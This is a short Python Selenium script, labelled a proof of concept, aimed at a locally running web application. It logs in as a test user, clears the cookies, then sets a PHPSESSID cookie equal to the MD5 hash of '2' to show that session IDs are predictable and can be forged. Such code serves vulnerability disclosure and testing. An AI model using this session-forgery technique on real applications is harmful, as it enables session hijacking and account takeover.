from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.by import By
import urllib.parse
import base64
import hashlib
parser = argparse.ArgumentParser(description='Port IP')
parser.add_argument('-p', dest='port', default=8001,
                    help='port where the application is running')

args = parser.parse_args()
port = args.port

# Starting the real POC

browser = webdriver.Firefox()
browser.get(f"http://localhost:{port}/user/login?from=/")
browser.set_window_size(827, 707)
time.sleep(1)
# This step is only required in order to have a session in the server
browser.find_element(By.ID, "username").click()
browser.find_element(By.ID, "username").send_keys("test")
browser.find_element(By.ID, "password").click()
browser.find_element(By.ID, "password").send_keys("test")
browser.find_element(By.ID, "Login").click()
time.sleep(1)
# Deleting all the cookies
browser.delete_all_cookies()
# Refreshing browser to show that the cookies are deleted and no session in place
browser.refresh()
time.sleep(2)
# Adding the cookie 
val = hashlib.md5(b'2').hexdigest()
browser.add_cookie({"name":"PHPSESSID","value":val})
# Refreshing browser to show that the cookie is badly generated
browser.refresh()
time.sleep(2)